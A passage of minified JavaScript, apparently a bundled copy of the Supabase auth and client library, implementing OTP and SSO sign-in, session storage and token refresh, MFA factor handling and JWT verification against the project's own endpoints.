de(this.fetch,"POST",`${this.url}/otp`,{headers:this.headers,body:{email:l,data:(r=c==null?void 0:c.data)!==null&&r!==void 0?r:{},create_user:(n=c==null?void 0:c.shouldCreateUser)!==null&&n!==void 0?n:!0,gotrue_meta_security:{captcha_token:c==null?void 0:c.captchaToken},code_challenge:d,code_challenge_method:u},redirectTo:c==null?void 0:c.emailRedirectTo});return{data:{user:null,session:null},error:h}}if("phone"in e){const{phone:l,options:c}=e,{data:d,error:u}=await de(this.fetch,"POST",`${this.url}/otp`,{headers:this.headers,body:{phone:l,data:(s=c==null?void 0:c.data)!==null&&s!==void 0?s:{},create_user:(i=c==null?void 0:c.shouldCreateUser)!==null&&i!==void 0?i:!0,gotrue_meta_security:{captcha_token:c==null?void 0:c.captchaToken},channel:(o=c==null?void 0:c.channel)!==null&&o!==void 0?o:"sms"}});return{data:{user:null,session:null,messageId:d==null?void 0:d.message_id},error:u}}throw new Eo("You must provide either an email or phone number.")}catch(l){if(ae(l))return{data:{user:null,session:null},error:l};throw l}}async verifyOtp(e){var r,n;try{let s,i;"options"in e&&(s=(r=e.options)===null||r===void 0?void 0:r.redirectTo,i=(n=e.options)===null||n===void 0?void 0:n.captchaToken);const{data:o,error:l}=await de(this.fetch,"POST",`${this.url}/verify`,{headers:this.headers,body:Object.assign(Object.assign({},e),{gotrue_meta_security:{captcha_token:i}}),redirectTo:s,xform:Pr});if(l)throw l;if(!o)throw new Error("An error occurred on token verification.");const c=o.session,d=o.user;return c!=null&&c.access_token&&(await this._saveSession(c),await this._notifyAllSubscribers(e.type=="recovery"?"PASSWORD_RECOVERY":"SIGNED_IN",c)),{data:{user:d,session:c},error:null}}catch(s){if(ae(s))return{data:{user:null,session:null},error:s};throw s}}async signInWithSSO(e){var r,n,s;try{let i=null,o=null;return this.flowType==="pkce"&&([i,o]=await Cs(this.storage,this.storageKey)),await de(this.fetch,"POST",`${this.url}/sso`,{body:Object.assign(Object.assign(Object.assign(Object.assign(Object.assign({},"providerId"in e?{provider_id:e.providerId}:null),"domain"in e?{domain:e.domain}:null),{redirect_to:(n=(r=e.options)===null||r===void 0?void 0:r.redirectTo)!==null&&n!==void 0?n:void 0}),!((s=e==null?void 0:e.options)===null||s===void 0)&&s.captchaToken?{gotrue_meta_security:{captcha_token:e.options.captchaToken}}:null),{skip_http_redirect:!0,code_challenge:i,code_challenge_method:o}),headers:this.headers,xform:v3})}catch(i){if(ae(i))return{data:null,error:i};throw i}}async reauthenticate(){return await this.initializePromise,await this._acquireLock(-1,async()=>await this._reauthenticate())}async _reauthenticate(){try{return await this._useSession(async e=>{const{data:{session:r},error:n}=e;if(n)throw n;if(!r)throw new Xr;const{error:s}=await de(this.fetch,"GET",`${this.url}/reauthenticate`,{headers:this.headers,jwt:r.access_token});return{data:{user:null,session:null},error:s}})}catch(e){if(ae(e))return{data:{user:null,session:null},error:e};throw e}}async resend(e){try{const r=`${this.url}/resend`;if("email"in e){const{email:n,type:s,options:i}=e,{error:o}=await de(this.fetch,"POST",r,{headers:this.headers,body:{email:n,type:s,gotrue_meta_security:{captcha_token:i==null?void 0:i.captchaToken}},redirectTo:i==null?void 0:i.emailRedirectTo});return{data:{user:null,session:null},error:o}}else if("phone"in e){const{phone:n,type:s,options:i}=e,{data:o,error:l}=await de(this.fetch,"POST",r,{headers:this.headers,body:{phone:n,type:s,gotrue_meta_security:{captcha_token:i==null?void 0:i.captchaToken}}});return{data:{user:null,session:null,messageId:o==null?void 0:o.message_id},error:l}}throw new Eo("You must provide either an email or phone number and a type")}catch(r){if(ae(r))return{data:{user:null,session:null},error:r};throw r}}async getSession(){return await this.initializePromise,await this._acquireLock(-1,async()=>this._useSession(async r=>r))}async _acquireLock(e,r){this._debug("#_acquireLock","begin",e);try{if(this.lockAcquired){const n=this.pendingInLock.length?this.pendingInLock[this.pendingInLock.length-1]:Promise.resolve(),s=(async()=>(await n,await r()))();return this.pendingInLock.push((async()=>{try{await s}catch{}})()),s}return await this.lock(`lock:${this.storageKey}`,e,async()=>{this._debug("#_acquireLock","lock acquired for storage key",this.storageKey);try{this.lockAcquired=!0;const n=r();for(this.pendingInLock.push((async()=>{try{await n}catch{}})()),await n;this.pendingInLock.length;){const s=[...this.pendingInLock];await Promise.all(s),this.pendingInLock.splice(0,s.length)}return await n}finally{this._debug("#_acquireLock","lock released for storage key",this.storageKey),this.lockAcquired=!1}})}finally{this._debug("#_acquireLock","end")}}async _useSession(e){this._debug("#_useSession","begin");try{const r=await this.__loadSession();return await e(r)}finally{this._debug("#_useSession","end")}}async __loadSession(){this._debug("#__loadSession()","begin"),this.lockAcquired||this._debug("#__loadSession()","used outside of an acquired lock!",new Error().stack);try{let e=null;const r=await Un(this.storage,this.storageKey);if(this._debug("#getSession()","session from storage",r),r!==null&&(this._isValidSession(r)?e=r:(this._debug("#getSession()","session from storage is not valid"),await this._removeSession())),!e)return{data:{session:null},error:null};const n=e.expires_at?e.expires_at*1e3-Date.now()<ad:!1;if(this._debug("#__loadSession()",`session has${n?"":" not"} expired`,"expires_at",e.expires_at),!n){if(this.userStorage){const o=await Un(this.userStorage,this.storageKey+"-user");o!=null&&o.user?e.user=o.user:e.user=ld()}if(this.storage.isServer&&e.user){let o=this.suppressGetSessionWarning;e=new Proxy(e,{get:(c,d,u)=>(!o&&d==="user"&&(console.warn("Using the user object as returned from supabase.auth.getSession() or from some supabase.auth.onAuthStateChange() events could be insecure! This value comes directly from the storage medium (usually cookies on the server) and may not be authentic. Use supabase.auth.getUser() instead which authenticates the data by contacting the Supabase Auth server."),o=!0,this.suppressGetSessionWarning=!0),Reflect.get(c,d,u))})}return{data:{session:e},error:null}}const{session:s,error:i}=await this._callRefreshToken(e.refresh_token);return i?{data:{session:null},error:i}:{data:{session:s},error:null}}finally{this._debug("#__loadSession()","end")}}async getUser(e){return e?await this._getUser(e):(await this.initializePromise,await this._acquireLock(-1,async()=>await this._getUser()))}async _getUser(e){try{return e?await de(this.fetch,"GET",`${this.url}/user`,{headers:this.headers,jwt:e,xform:nn}):await this._useSession(async r=>{var n,s,i;const{data:o,error:l}=r;if(l)throw l;return!(!((n=o.session)===null||n===void 0)&&n.access_token)&&!this.hasCustomAuthorizationHeader?{data:{user:null},error:new Xr}:await de(this.fetch,"GET",`${this.url}/user`,{headers:this.headers,jwt:(i=(s=o.session)===null||s===void 0?void 0:s.access_token)!==null&&i!==void 0?i:void 0,xform:nn})})}catch(r){if(ae(r))return GE(r)&&(await this._removeSession(),await Yr(this.storage,`${this.storageKey}-code-verifier`)),{data:{user:null},error:r};throw r}}async updateUser(e,r={}){return await this.initializePromise,await this._acquireLock(-1,async()=>await this._updateUser(e,r))}async _updateUser(e,r={}){try{return await this._useSession(async n=>{const{data:s,error:i}=n;if(i)throw i;if(!s.session)throw new Xr;const o=s.session;let l=null,c=null;this.flowType==="pkce"&&e.email!=null&&([l,c]=await Cs(this.storage,this.storageKey));const{data:d,error:u}=await de(this.fetch,"PUT",`${this.url}/user`,{headers:this.headers,redirectTo:r==null?void 0:r.emailRedirectTo,body:Object.assign(Object.assign({},e),{code_challenge:l,code_challenge_method:c}),jwt:o.access_token,xform:nn});if(u)throw u;return o.user=d.user,await this._saveSession(o),await this._notifyAllSubscribers("USER_UPDATED",o),{data:{user:o.user},error:null}})}catch(n){if(ae(n))return{data:{user:null},error:n};throw n}}async setSession(e){return await this.initializePromise,await this._acquireLock(-1,async()=>await this._setSession(e))}async _setSession(e){try{if(!e.access_token||!e.refresh_token)throw new Xr;const r=Date.now()/1e3;let n=r,s=!0,i=null;const{payload:o}=od(e.access_token);if(o.exp&&(n=o.exp,s=n<=r),s){const{session:l,error:c}=await this._callRefreshToken(e.refresh_token);if(c)return{data:{user:null,session:null},error:c};if(!l)return{data:{user:null,session:null},error:null};i=l}else{const{data:l,error:c}=await this._getUser(e.access_token);if(c)throw c;i={access_token:e.access_token,refresh_token:e.refresh_token,user:l.user,token_type:"bearer",expires_in:n-r,expires_at:n},await this._saveSession(i),await this._notifyAllSubscribers("SIGNED_IN",i)}return{data:{user:i.user,session:i},error:null}}catch(r){if(ae(r))return{data:{session:null,user:null},error:r};throw r}}async refreshSession(e){return await this.initializePromise,await this._acquireLock(-1,async()=>await this._refreshSession(e))}async _refreshSession(e){try{return await this._useSession(async r=>{var n;if(!e){const{data:o,error:l}=r;if(l)throw l;e=(n=o.session)!==null&&n!==void 0?n:void 0}if(!(e!=null&&e.refresh_token))throw new Xr;const{session:s,error:i}=await this._callRefreshToken(e.refresh_token);return i?{data:{user:null,session:null},error:i}:s?{data:{user:s.user,session:s},error:null}:{data:{user:null,session:null},error:null}})}catch(r){if(ae(r))return{data:{user:null,session:null},error:r};throw r}}async _getSessionFromURL(e,r){try{if(!Xt())throw new Co("No browser detected.");if(e.error||e.error_description||e.error_code)throw new Co(e.error_description||"Error in URL with unspecified error_description",{error:e.error||"unspecified_error",code:e.error_code||"unspecified_code"});switch(r){case"implicit":if(this.flowType==="pkce")throw new P0("Not a valid PKCE flow url.");break;case"pkce":if(this.flowType==="implicit")throw new Co("Not a valid implicit grant flow url.");break;default:}if(r==="pkce"){if(this._debug("#_initialize()","begin","is PKCE flow",!0),!e.code)throw new P0("No code detected.");const{data:x,error:b}=await this._exchangeCodeForSession(e.code);if(b)throw b;const j=new URL(window.location.href);return j.searchParams.delete("code"),window.history.replaceState(window.history.state,"",j.toString()),{data:{session:x.session,redirectType:null},error:null}}const{provider_token:n,provider_refresh_token:s,access_token:i,refresh_token:o,expires_in:l,expires_at:c,token_type:d}=e;if(!i||!l||!o||!d)throw new Co("No session defined in URL");const u=Math.round(Date.now()/1e3),h=parseInt(l);let f=u+h;c&&(f=parseInt(c));const m=f-u;m*1e3<=Ls&&console.warn(`@supabase/gotrue-js: Session as retrieved from URL expires in ${m}s, should have been closer to ${h}s`);const g=f-h;u-g>=120?console.warn("@supabase/gotrue-js: Session as retrieved from URL was issued over 120s ago, URL could be stale",g,f,u):u-g<0&&console.warn("@supabase/gotrue-js: Session as retrieved from URL was issued in the future? Check the device clock for skew",g,f,u);const{data:v,error:w}=await this._getUser(i);if(w)throw w;const y={provider_token:n,provider_refresh_token:s,access_token:i,expires_in:h,expires_at:f,refresh_token:o,token_type:d,user:v.user};return window.location.hash="",this._debug("#_getSessionFromURL()","clearing window.location.hash"),{data:{session:y,redirectType:e.type},error:null}}catch(n){if(ae(n))return{data:{session:null,redirectType:null},error:n};throw n}}_isImplicitGrantCallback(e){return!!(e.access_token||e.error_description)}async _isPKCECallback(e){const r=await Un(this.storage,`${this.storageKey}-code-verifier`);return!!(e.code&&r)}async signOut(e={scope:"global"}){return await this.initializePromise,await this._acquireLock(-1,async()=>await this._signOut(e))}async _signOut({scope:e}={scope:"global"}){return await this._useSession(async r=>{var n;const{data:s,error:i}=r;if(i)return{error:i};const o=(n=s.session)===null||n===void 0?void 0:n.access_token;if(o){const{error:l}=await this.admin.signOut(o,e);if(l&&!(HE(l)&&(l.status===404||l.status===401||l.status===403)))return{error:l}}return e!=="others"&&(await this._removeSession(),await Yr(this.storage,`${this.storageKey}-code-verifier`)),{error:null}})}onAuthStateChange(e){const r=t3(),n={id:r,callback:e,unsubscribe:()=>{this._debug("#unsubscribe()","state change callback with id removed",r),this.stateChangeEmitters.delete(r)}};return this._debug("#onAuthStateChange()","registered callback with id",r),this.stateChangeEmitters.set(r,n),(async()=>(await this.initializePromise,await this._acquireLock(-1,async()=>{this._emitInitialSession(r)})))(),{data:{subscription:n}}}async _emitInitialSession(e){return await this._useSession(async r=>{var n,s;try{const{data:{session:i},error:o}=r;if(o)throw o;await((n=this.stateChangeEmitters.get(e))===null||n===void 0?void 0:n.callback("INITIAL_SESSION",i)),this._debug("INITIAL_SESSION","callback id",e,"session",i)}catch(i){await((s=this.stateChangeEmitters.get(e))===null||s===void 0?void 0:s.callback("INITIAL_SESSION",null)),this._debug("INITIAL_SESSION","callback id",e,"error",i),console.error(i)}})}async resetPasswordForEmail(e,r={}){let n=null,s=null;this.flowType==="pkce"&&([n,s]=await Cs(this.storage,this.storageKey,!0));try{return await de(this.fetch,"POST",`${this.url}/recover`,{body:{email:e,code_challenge:n,code_challenge_method:s,gotrue_meta_security:{captcha_token:r.captchaToken}},headers:this.headers,redirectTo:r.redirectTo})}catch(i){if(ae(i))return{data:null,error:i};throw i}}async getUserIdentities(){var e;try{const{data:r,error:n}=await this.getUser();if(n)throw n;return{data:{identities:(e=r.user.identities)!==null&&e!==void 0?e:[]},error:null}}catch(r){if(ae(r))return{data:null,error:r};throw r}}async linkIdentity(e){var r;try{const{data:n,error:s}=await this._useSession(async i=>{var o,l,c,d,u;const{data:h,error:f}=i;if(f)throw f;const m=await this._getUrlForProvider(`${this.url}/user/identities/authorize`,e.provider,{redirectTo:(o=e.options)===null||o===void 0?void 0:o.redirectTo,scopes:(l=e.options)===null||l===void 0?void 0:l.scopes,queryParams:(c=e.options)===null||c===void 0?void 0:c.queryParams,skipBrowserRedirect:!0});return await de(this.fetch,"GET",m,{headers:this.headers,jwt:(u=(d=h.session)===null||d===void 0?void 0:d.access_token)!==null&&u!==void 0?u:void 0})});if(s)throw s;return Xt()&&!(!((r=e.options)===null||r===void 0)&&r.skipBrowserRedirect)&&window.location.assign(n==null?void 0:n.url),{data:{provider:e.provider,url:n==null?void 0:n.url},error:null}}catch(n){if(ae(n))return{data:{provider:e.provider,url:null},error:n};throw n}}async unlinkIdentity(e){try{return await this._useSession(async r=>{var n,s;const{data:i,error:o}=r;if(o)throw o;return await de(this.fetch,"DELETE",`${this.url}/user/identities/${e.identity_id}`,{headers:this.headers,jwt:(s=(n=i.session)===null||n===void 0?void 0:n.access_token)!==null&&s!==void 0?s:void 0})})}catch(r){if(ae(r))return{data:null,error:r};throw r}}async _refreshAccessToken(e){const r=`#_refreshAccessToken(${e.substring(0,5)}...)`;this._debug(r,"begin");try{const n=Date.now();return await a3(async s=>(s>0&&await s3(200*Math.pow(2,s-1)),this._debug(r,"refreshing attempt",s),await de(this.fetch,"POST",`${this.url}/token?grant_type=refresh_token`,{body:{refresh_token:e},headers:this.headers,xform:Pr})),(s,i)=>{const o=200*Math.pow(2,s);return i&&id(i)&&Date.now()+o-n<Ls})}catch(n){if(this._debug(r,"error",n),ae(n))return{data:{session:null,user:null},error:n};throw n}finally{this._debug(r,"end")}}_isValidSession(e){return typeof e=="object"&&e!==null&&"access_token"in e&&"refresh_token"in e&&"expires_at"in e}async _handleProviderSignIn(e,r){const n=await this._getUrlForProvider(`${this.url}/authorize`,e,{redirectTo:r.redirectTo,scopes:r.scopes,queryParams:r.queryParams});return this._debug("#_handleProviderSignIn()","provider",e,"options",r,"url",n),Xt()&&!r.skipBrowserRedirect&&window.location.assign(n),{data:{provider:e,url:n},error:null}}async _recoverAndRefresh(){var e,r;const n="#_recoverAndRefresh()";this._debug(n,"begin");try{const s=await Un(this.storage,this.storageKey);if(s&&this.userStorage){let o=await Un(this.userStorage,this.storageKey+"-user");!this.storage.isServer&&Object.is(this.storage,this.userStorage)&&!o&&(o={user:s.user},await Ms(this.userStorage,this.storageKey+"-user",o)),s.user=(e=o==null?void 0:o.user)!==null&&e!==void 0?e:ld()}else if(s&&!s.user&&!s.user){const o=await Un(this.storage,this.storageKey+"-user");o&&(o!=null&&o.user)?(s.user=o.user,await Yr(this.storage,this.storageKey+"-user"),await Ms(this.storage,this.storageKey,s)):s.user=ld()}if(this._debug(n,"session from storage",s),!this._isValidSession(s)){this._debug(n,"session is not valid"),s!==null&&await this._removeSession();return}const i=((r=s.expires_at)!==null&&r!==void 0?r:1/0)*1e3-Date.now()<ad;if(this._debug(n,`session has${i?"":" not"} expired with margin of ${ad}s`),i){if(this.autoRefreshToken&&s.refresh_token){const{error:o}=await this._callRefreshToken(s.refresh_token);o&&(console.error(o),id(o)||(this._debug(n,"refresh failed with a non-retryable error, removing the session",o),await this._removeSession()))}}else if(s.user&&s.user.__isUserNotAvailableProxy===!0)try{const{data:o,error:l}=await this._getUser(s.access_token);!l&&(o!=null&&o.user)?(s.user=o.user,await this._saveSession(s),await this._notifyAllSubscribers("SIGNED_IN",s)):this._debug(n,"could not get user data, skipping SIGNED_IN notification")}catch(o){console.error("Error getting user data:",o),this._debug(n,"error getting user data, skipping SIGNED_IN notification",o)}else await this._notifyAllSubscribers("SIGNED_IN",s)}catch(s){this._debug(n,"error",s),console.error(s);return}finally{this._debug(n,"end")}}async _callRefreshToken(e){var r,n;if(!e)throw new Xr;if(this.refreshingDeferred)return this.refreshingDeferred.promise;const s=`#_callRefreshToken(${e.substring(0,5)}...)`;this._debug(s,"begin");try{this.refreshingDeferred=new gc;const{data:i,error:o}=await this._refreshAccessToken(e);if(o)throw o;if(!i.session)throw new Xr;await this._saveSession(i.session),await this._notifyAllSubscribers("TOKEN_REFRESHED",i.session);const l={session:i.session,error:null};return this.refreshingDeferred.resolve(l),l}catch(i){if(this._debug(s,"error",i),ae(i)){const o={session:null,error:i};return id(i)||await this._removeSession(),(r=this.refreshingDeferred)===null||r===void 0||r.resolve(o),o}throw(n=this.refreshingDeferred)===null||n===void 0||n.reject(i),i}finally{this.refreshingDeferred=null,this._debug(s,"end")}}async _notifyAllSubscribers(e,r,n=!0){const s=`#_notifyAllSubscribers(${e})`;this._debug(s,"begin",r,`broadcast = ${n}`);try{this.broadcastChannel&&n&&this.broadcastChannel.postMessage({event:e,session:r});const i=[],o=Array.from(this.stateChangeEmitters.values()).map(async l=>{try{await l.callback(e,r)}catch(c){i.push(c)}});if(await Promise.all(o),i.length>0){for(let l=0;l<i.length;l+=1)console.error(i[l]);throw i[0]}}finally{this._debug(s,"end")}}async _saveSession(e){this._debug("#_saveSession()",e),this.suppressGetSessionWarning=!0;const r=Object.assign({},e),n=r.user&&r.user.__isUserNotAvailableProxy===!0;if(this.userStorage){!n&&r.user&&await Ms(this.userStorage,this.storageKey+"-user",{user:r.user});const s=Object.assign({},r);delete s.user;const i=M0(s);await Ms(this.storage,this.storageKey,i)}else{const s=M0(r);await Ms(this.storage,this.storageKey,s)}}async _removeSession(){this._debug("#_removeSession()"),await Yr(this.storage,this.storageKey),await Yr(this.storage,this.storageKey+"-code-verifier"),await Yr(this.storage,this.storageKey+"-user"),this.userStorage&&await Yr(this.userStorage,this.storageKey+"-user"),await this._notifyAllSubscribers("SIGNED_OUT",null)}_removeVisibilityChangedCallback(){this._debug("#_removeVisibilityChangedCallback()");const e=this.visibilityChangedCallback;this.visibilityChangedCallback=null;try{e&&Xt()&&(window!=null&&window.removeEventListener)&&window.removeEventListener("visibilitychange",e)}catch(r){console.error("removing visibilitychange callback failed",r)}}async _startAutoRefresh(){await this._stopAutoRefresh(),this._debug("#_startAutoRefresh()");const e=setInterval(()=>this._autoRefreshTokenTick(),Ls);this.autoRefreshTicker=e,e&&typeof e=="object"&&typeof e.unref=="function"?e.unref():typeof Deno<"u"&&typeof Deno.unrefTimer=="function"&&Deno.unrefTimer(e),setTimeout(async()=>{await this.initializePromise,await this._autoRefreshTokenTick()},0)}async _stopAutoRefresh(){this._debug("#_stopAutoRefresh()");const e=this.autoRefreshTicker;this.autoRefreshTicker=null,e&&clearInterval(e)}async startAutoRefresh(){this._removeVisibilityChangedCallback(),await this._startAutoRefresh()}async stopAutoRefresh(){this._removeVisibilityChangedCallback(),await this._stopAutoRefresh()}async _autoRefreshTokenTick(){this._debug("#_autoRefreshTokenTick()","begin");try{await this._acquireLock(0,async()=>{try{const e=Date.now();try{return await this._useSession(async r=>{const{data:{session:n}}=r;if(!n||!n.refresh_token||!n.expires_at){this._debug("#_autoRefreshTokenTick()","no session");return}const s=Math.floor((n.expires_at*1e3-e)/Ls);this._debug("#_autoRefreshTokenTick()",`access token expires in ${s} ticks, a tick lasts ${Ls}ms, refresh threshold is ${Pu} ticks`),s<=Pu&&await this._callRefreshToken(n.refresh_token)})}catch(r){console.error("Auto refresh tick failed with error. This is likely a transient error.",r)}}finally{this._debug("#_autoRefreshTokenTick()","end")}})}catch(e){if(e.isAcquireTimeout||e instanceof Av)this._debug("auto refresh token tick lock not available");else throw e}}async _handleVisibilityChange(){if(this._debug("#_handleVisibilityChange()"),!Xt()||!(window!=null&&window.addEventListener))return this.autoRefreshToken&&this.startAutoRefresh(),!1;try{this.visibilityChangedCallback=async()=>await this._onVisibilityChanged(!1),window==null||window.addEventListener("visibilitychange",this.visibilityChangedCallback),await this._onVisibilityChanged(!0)}catch(e){console.error("_handleVisibilityChange",e)}}async _onVisibilityChanged(e){const r=`#_onVisibilityChanged(${e})`;this._debug(r,"visibilityState",document.visibilityState),document.visibilityState==="visible"?(this.autoRefreshToken&&this._startAutoRefresh(),e||(await this.initializePromise,await this._acquireLock(-1,async()=>{if(document.visibilityState!=="visible"){this._debug(r,"acquired the lock to recover the session, but the browser visibilityState is no longer visible, aborting");return}await this._recoverAndRefresh()}))):document.visibilityState==="hidden"&&this.autoRefreshToken&&this._stopAutoRefresh()}async _getUrlForProvider(e,r,n){const s=[`provider=${encodeURIComponent(r)}`];if(n!=null&&n.redirectTo&&s.push(`redirect_to=${encodeURIComponent(n.redirectTo)}`),n!=null&&n.scopes&&s.push(`scopes=${encodeURIComponent(n.scopes)}`),this.flowType==="pkce"){const[i,o]=await Cs(this.storage,this.storageKey),l=new URLSearchParams({code_challenge:`${encodeURIComponent(i)}`,code_challenge_method:`${encodeURIComponent(o)}`});s.push(l.toString())}if(n!=null&&n.queryParams){const i=new URLSearchParams(n.queryParams);s.push(i.toString())}return n!=null&&n.skipBrowserRedirect&&s.push(`skip_http_redirect=${n.skipBrowserRedirect}`),`${e}?${s.join("&")}`}async _unenroll(e){try{return await this._useSession(async r=>{var n;const{data:s,error:i}=r;return i?{data:null,error:i}:await de(this.fetch,"DELETE",`${this.url}/factors/${e.factorId}`,{headers:this.headers,jwt:(n=s==null?void 0:s.session)===null||n===void 0?void 0:n.access_token})})}catch(r){if(ae(r))return{data:null,error:r};throw r}}async _enroll(e){try{return await this._useSession(async r=>{var n,s;const{data:i,error:o}=r;if(o)return{data:null,error:o};const l=Object.assign({friendly_name:e.friendlyName,factor_type:e.factorType},e.factorType==="phone"?{phone:e.phone}:{issuer:e.issuer}),{data:c,error:d}=await de(this.fetch,"POST",`${this.url}/factors`,{body:l,headers:this.headers,jwt:(n=i==null?void 0:i.session)===null||n===void 0?void 0:n.access_token});return d?{data:null,error:d}:(e.factorType==="totp"&&(!((s=c==null?void 0:c.totp)===null||s===void 0)&&s.qr_code)&&(c.totp.qr_code=`data:image/svg+xml;utf-8,${c.totp.qr_code}`),{data:c,error:null})})}catch(r){if(ae(r))return{data:null,error:r};throw r}}async _verify(e){return this._acquireLock(-1,async()=>{try{return await this._useSession(async r=>{var n;const{data:s,error:i}=r;if(i)return{data:null,error:i};const{data:o,error:l}=await de(this.fetch,"POST",`${this.url}/factors/${e.factorId}/verify`,{body:{code:e.code,challenge_id:e.challengeId},headers:this.headers,jwt:(n=s==null?void 0:s.session)===null||n===void 0?void 0:n.access_token});return l?{data:null,error:l}:(await this._saveSession(Object.assign({expires_at:Math.round(Date.now()/1e3)+o.expires_in},o)),await this._notifyAllSubscribers("MFA_CHALLENGE_VERIFIED",o),{data:o,error:l})})}catch(r){if(ae(r))return{data:null,error:r};throw r}})}async _challenge(e){return this._acquireLock(-1,async()=>{try{return await this._useSession(async r=>{var n;const{data:s,error:i}=r;return i?{data:null,error:i}:await de(this.fetch,"POST",`${this.url}/factors/${e.factorId}/challenge`,{body:{channel:e.channel},headers:this.headers,jwt:(n=s==null?void 0:s.session)===null||n===void 0?void 0:n.access_token})})}catch(r){if(ae(r))return{data:null,error:r};throw r}})}async _challengeAndVerify(e){const{data:r,error:n}=await this._challenge({factorId:e.factorId});return n?{data:null,error:n}:await this._verify({factorId:e.factorId,challengeId:r.id,code:e.code})}async _listFactors(){const{data:{user:e},error:r}=await this.getUser();if(r)return{data:null,error:r};const n=(e==null?void 0:e.factors)||[],s=n.filter(o=>o.factor_type==="totp"&&o.status==="verified"),i=n.filter(o=>o.factor_type==="phone"&&o.status==="verified");return{data:{all:n,totp:s,phone:i},error:null}}async _getAuthenticatorAssuranceLevel(){return this._acquireLock(-1,async()=>await this._useSession(async e=>{var r,n;const{data:{session:s},error:i}=e;if(i)return{data:null,error:i};if(!s)return{data:{currentLevel:null,nextLevel:null,currentAuthenticationMethods:[]},error:null};const{payload:o}=od(s.access_token);let l=null;o.aal&&(l=o.aal);let c=l;((n=(r=s.user.factors)===null||r===void 0?void 0:r.filter(h=>h.status==="verified"))!==null&&n!==void 0?n:[]).length>0&&(c="aal2");const u=o.amr||[];return{data:{currentLevel:l,nextLevel:c,currentAuthenticationMethods:u},error:null}}))}async fetchJwk(e,r={keys:[]}){let n=r.keys.find(l=>l.kid===e);if(n)return n;const s=Date.now();if(n=this.jwks.keys.find(l=>l.kid===e),n&&this.jwks_cached_at+BE>s)return n;const{data:i,error:o}=await de(this.fetch,"GET",`${this.url}/.well-known/jwks.json`,{headers:this.headers});if(o)throw o;return!i.keys||i.keys.length===0||(this.jwks=i,this.jwks_cached_at=s,n=i.keys.find(l=>l.kid===e),!n)?null:n}async getClaims(e,r={}){try{let n=e;if(!n){const{data:m,error:g}=await this.getSession();if(g||!m.session)return{data:null,error:g};n=m.session.access_token}const{header:s,payload:i,signature:o,raw:{header:l,payload:c}}=od(n);r!=null&&r.allowExpired||h3(i.exp);const d=!s.alg||s.alg.startsWith("HS")||!s.kid||!("crypto"in globalThis&&"subtle"in globalThis.crypto)?null:await this.fetchJwk(s.kid,r!=null&&r.keys?{keys:r.keys}:r==null?void 0:r.jwks);if(!d){const{error:m}=await this.getUser(n);if(m)throw m;return{data:{claims:i,header:s,signature:o},error:null}}const u=f3(s.alg),h=await crypto.subtle.importKey("jwk",d,u,!0,["verify"]);if(!await crypto.subtle.verify(u,h,o,XE(`${l}.${c}`)))throw new Iu("Invalid JWT signature");return{data:{claims:i,header:s,signature:o},error:null}}catch(n){if(ae(n))return{data:null,error:n};throw n}}}zi.nextInstanceID=0;const T3=zi;class P3 extends T3{constructor(e){super(e)}}var A3=function(t,e,r,n){function s(i){return i instanceof r?i:new r(function(o){o(i)})}return new(r||(r=Promise))(function(i,o){function l(u){try{d(n.next(u))}catch(h){o(h)}}function c(u){try{d(n.throw(u))}catch(h){o(h)}}function d(u){u.done?i(u.value):s(u.value).then(l,c)}d((n=n.apply(t,e||[])).next())})};class R3{constructor(e,r,n){var s,i,o;if(this.supabaseUrl=e,this.supabaseKey=r,!e)throw new Error("supabaseUrl is required.");if(!r)throw new Error("supabaseKey is required.");const l=OE(e),c=new URL(l);this.realtimeUrl=new URL("realtime/v1",c),this.realtimeUrl.protocol=this.realtimeUrl.protocol.replace("http","ws"),this.authUrl=new URL("auth/v1",c),this.storageUrl=new URL("storage/v1",c),this.functionsUrl=new URL("functions/v1",c);const d=`sb-${c.hostname.split(".")[0]}-auth-token`,u={db:CE,realtime:PE,auth:Object.assign(Object.assign({},TE),{storageKey:d}),global:EE},h=$E(n??{},u);this.storageKey=(s=h.auth.storageKey)!==null&&s!==void 0?s:"",this.headers=(i=h.global.headers)!==null&&i!==void 0?i:{},h.accessToken?(this.accessToken=h.accessToken,this.auth=new Proxy({},{get:(f,m)=>{throw new Error(`@supabase/supabase-js: Supabase Client is configured with the accessToken option, accessing supabase.auth.${String(m)} is not possible`)}})):this.auth=this._initSupabaseAuthClient((o=h.auth)!==null&&o!==void 0?o:{},this.headers,h.global.fetch),this.fetch=LE(r,this._getAccessToken.bind(this),h.global.fetch),this.realtime=this._initRealtimeClient(Object.assign({headers:this.headers,accessToken:this._getAccessToken.bind(this)},h.realtime)),this.rest=new Yk(new URL("rest/v1",c).href,{headers:this.headers,schema:h.db.schema,fetch:this.fetch}),this.storage=new NE(this.storageUrl.href,this.headers,this.fetch,n==null?void 0:n.storage),h.accessToken||this._listenForAuthEvents()}get functions(){return new kk(this.functionsUrl.href,{headers:this.headers,customFetch:this.fetch})}from(e){return this.rest.from(e)}schema(e){return this.rest.schema(e)}rpc(e,r={},n={}){return this.rest.rpc(e,r,n)}channel(e,r={config:{}}){return this.realtime.channel(e,r)}getChannels(){return this.realtime.getChannels()}removeChannel(e){return this.realtime.removeChannel(e)}removeAllChannels(){return this.realtime.removeAllChannels()}_getAccessToken(){var e,r;return A3(this,void 0,void 0,function*(){if(this.accessToken)return yield this.accessToken();const{data:n}=yield this.auth.getSession();return(r=(e=n.session)===null||e===void 0?void 0:e.access_token)!==null&&r!==void 0?r:null})}_initSupabaseAuthClient({autoRefreshToken:e,persistSession:r,detectSessionInUrl:n,storage:s,storageKey:i,flowType:o,lock:l,debug:c},d,u){const h={Authorization:`Bearer ${this.supabaseKey}`,apikey:`${this.supabaseKey}`};return new P3({url:this.authUrl.href,headers:Object.assign(Object.assign({},h),d),storageKey:i,autoRefreshToken:e,persistSession:r,detectSessionInUrl:n,storage:s,flowType:o,lock:l,debug:c,fetch:u,hasCustomAuthorizationHeader:"Authorization"in this.headers})}_initRealtimeClient(e){return new uE(this.realtimeUrl.href,Object.assign(Object.assign({},e),{params:Object.assign({apikey:this.supabaseKey},e==null?void 0:e.params)}))}_listenForAuthEvents(){return this.auth.onAuthStateChange((r,n)=>{this._handleTokenChanged(r,"CLIENT",n==null?void 0:n.access_token)})}_handleTokenChanged(e,r,n){(e==="TOKEN_REFRESHED"||e==="SIGNED_IN")&&this.changedAccessToken!==n?this.changedAccessToken=n:e==="SIGNED_OUT"&&(this.realtime.setAuth(),r=="STORAGE"&&this.auth.signOut(),this.changedAccessToken=void 0)}}const I3=(t,e,r)=>new R3(t,e,r);function L3(){if(typeof window<"u"||typeof process>"u"||process.version===void 0||process.version===null)return!1;const 